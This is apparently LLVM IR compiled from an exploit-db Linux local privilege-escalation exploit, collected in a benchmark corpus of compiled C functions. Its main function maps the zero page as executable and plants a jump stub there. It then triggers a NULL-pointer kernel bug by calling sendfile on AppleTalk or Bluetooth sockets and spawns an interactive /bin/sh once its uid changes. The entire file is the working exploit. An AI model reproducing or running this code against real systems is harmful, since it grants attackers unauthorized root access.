; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9479.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9479.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@uid = common dso_local global i64 0, align 8
@gid = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"[-] check ur uid\0A\00", align 1
@PER_SVR4 = common dso_local global i64 0, align 8
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [15 x i8] c"[-] mprotect()\00", align 1
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [11 x i8] c"[-] mmap()\00", align 1
@kernel = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"[-] open()\00", align 1
@PF_APPLETALK = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@PF_BLUETOOTH = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [13 x i8] c"[-] socket()\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"[-] sendfile()\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-i\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %10 = call i64 (...) @getuid()
  store i64 %10, i64* @uid, align 8
  %11 = call i32 (...) @getgid()
  store i32 %11, i32* @gid, align 4
  %12 = load i64, i64* @uid, align 8
  %13 = icmp eq i64 %12, 0
  br i1 %13, label %14, label %17

14:                                               ; preds = %2
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

17:                                               ; preds = %2
  %18 = call i64 @personality(i32 -1)
  %19 = load i64, i64* @PER_SVR4, align 8
  %20 = icmp eq i64 %18, %19
  br i1 %20, label %21, label %32

21:                                               ; preds = %17
  %22 = load i32, i32* @PROT_READ, align 4
  %23 = load i32, i32* @PROT_WRITE, align 4
  %24 = or i32 %22, %23
  %25 = load i32, i32* @PROT_EXEC, align 4
  %26 = or i32 %24, %25
  %27 = call i32 @mprotect(i32 0, i32 4096, i32 %26)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %31

29:                                               ; preds = %21
  %30 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

31:                                               ; preds = %21
  br label %49

32:                                               ; preds = %17
  %33 = load i32, i32* @PROT_READ, align 4
  %34 = load i32, i32* @PROT_WRITE, align 4
  %35 = or i32 %33, %34
  %36 = load i32, i32* @PROT_EXEC, align 4
  %37 = or i32 %35, %36
  %38 = load i32, i32* @MAP_FIXED, align 4
  %39 = load i32, i32* @MAP_ANONYMOUS, align 4
  %40 = or i32 %38, %39
  %41 = load i32, i32* @MAP_PRIVATE, align 4
  %42 = or i32 %40, %41
  %43 = call i8* @mmap(i32 0, i32 4096, i32 %37, i32 %42, i32 0, i32 0)
  store i8* %43, i8** %9, align 8
  %44 = load i8*, i8** @MAP_FAILED, align 8
  %45 = icmp eq i8* %43, %44
  br i1 %45, label %46, label %48

46:                                               ; preds = %32
  %47 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

48:                                               ; preds = %32
  br label %49

49:                                               ; preds = %48, %31
  store i8 -1, i8* null, align 1
  store i8 37, i8* inttoptr (i64 1 to i8*), align 1
  store i64 ptrtoint (i32* @kernel to i64), i64* inttoptr (i64 2 to i64*), align 8
  store i8 -61, i8* inttoptr (i64 6 to i8*), align 1
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* @O_RDONLY, align 4
  %54 = call i32 @open(i8* %52, i32 %53)
  store i32 %54, i32* %6, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %58

56:                                               ; preds = %49
  %57 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

58:                                               ; preds = %49
  %59 = load i32, i32* @PF_APPLETALK, align 4
  %60 = load i32, i32* @SOCK_DGRAM, align 4
  %61 = call i32 @socket(i32 %59, i32 %60, i32 0)
  store i32 %61, i32* %7, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %71

63:                                               ; preds = %58
  %64 = load i32, i32* @PF_BLUETOOTH, align 4
  %65 = load i32, i32* @SOCK_DGRAM, align 4
  %66 = call i32 @socket(i32 %64, i32 %65, i32 0)
  store i32 %66, i32* %7, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %70

68:                                               ; preds = %63
  %69 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

70:                                               ; preds = %63
  br label %71

71:                                               ; preds = %70, %58
  br label %72

72:                                               ; preds = %96, %71
  %73 = load i32, i32* %7, align 4
  %74 = load i32, i32* %6, align 4
  %75 = call i32 @sendfile(i32 %73, i32 %74, i32* %8, i32 2)
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %88

77:                                               ; preds = %72
  %78 = load i32, i32* %8, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %82

80:                                               ; preds = %77
  %81 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %103

82:                                               ; preds = %77
  %83 = load i32, i32* %7, align 4
  %84 = call i32 @close(i32 %83)
  %85 = load i32, i32* @PF_BLUETOOTH, align 4
  %86 = load i32, i32* @SOCK_DGRAM, align 4
  %87 = call i32 @socket(i32 %85, i32 %86, i32 0)
  store i32 %87, i32* %7, align 4
  br label %88

88:                                               ; preds = %82, %72
  %89 = call i64 (...) @getuid()
  %90 = load i64, i64* @uid, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %8, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

95:                                               ; preds = %92
  store i32 0, i32* %8, align 4
  br label %96

96:                                               ; preds = %95, %92
  br label %72

97:                                               ; preds = %88
  %98 = load i32, i32* %6, align 4
  %99 = call i32 @close(i32 %98)
  %100 = load i32, i32* %7, align 4
  %101 = call i32 @close(i32 %100)
  %102 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i32* null)
  store i32 0, i32* %3, align 4
  br label %103

103:                                              ; preds = %97, %80, %68, %56, %46, %29, %14
  %104 = load i32, i32* %3, align 4
  ret i32 %104
}

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @personality(i32) #1

declare dso_local i32 @mprotect(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i8* @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendfile(i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
